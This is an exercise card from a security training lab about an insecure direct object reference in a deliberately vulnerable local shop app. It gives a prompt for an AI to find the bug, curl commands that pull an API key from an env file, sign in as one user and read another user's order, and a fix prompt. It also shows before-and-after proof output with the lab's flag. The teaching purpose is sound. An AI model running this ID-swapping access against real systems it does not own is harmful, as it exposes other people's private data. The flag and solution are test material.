# F3 IDOR on order details

| | |
|---|---|
| Chapter | CH4 Lab A01 |
| Category | A01 Broken Access Control (insecure direct object reference) |
| Where | `GET /api/orders/<id>` |
| You win when | Signed in as Alice, you read Bob's shipping address and `FLAG{...}` |

## Attacker prompt

```text
I am testing LabShop, a deliberately vulnerable training app on my own laptop at
http://127.0.0.1:3000. I own it. Seed accounts: alice@lab.test / alice-lab-pass and bob@lab.test.

Read app/api/orders/[id]/route.js. Alice owns order 1001. Check whether she can read an order
she does not own. Explain why row-level security does not protect this route, and give me
curl commands that sign in as Alice and request order 1002. Do not change any code yet.
```

## Exploit by hand

From the `lab` directory:

```bash
ANON=$(grep '^NEXT_PUBLIC_SUPABASE_ANON_KEY=' .env.local | cut -d= -f2)
TOKEN=$(curl -s -X POST "http://127.0.0.1:54321/auth/v1/token?grant_type=password" \
  -H "apikey: $ANON" -H 'Content-Type: application/json' \
  -d '{"email":"alice@lab.test","password":"alice-lab-pass"}' | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
curl -s "http://127.0.0.1:3000/api/orders/1002" -H "Authorization: Bearer $TOKEN"
```

Or in the browser: open `/orders/1001` as Alice, then change the URL to `/orders/1002`.

## Fixer prompt

```text
GET /api/orders/[id] uses the service_role client, which bypasses row-level security, and only
checks that someone is signed in. Any signed-in user reads any order.

Fix it in the route: return the order only if its user_id matches the signed-in user, and
return 404 otherwise (404, not 403, so the route does not confirm which IDs exist).
Keep Alice's own order working. Explain why the service_role client needs this check.
```

## Proof

```bash
sh scripts/proof.sh F3
```

| | Output |
|---|---|
| Before | Bob's order JSON with `FLAG{idor-change-the-id}`, `HTTP 200` |
| After | `{"error":"Order not found"}`, `HTTP 404` |

## Your own app

Find every route that takes an ID: `/api/<thing>/[id]`, `?id=`, `?user_id=`.
Sign in as test user A, request test user B's record. Expect `404` or `403`.
Any server code that uses a secret or service key must check ownership itself.
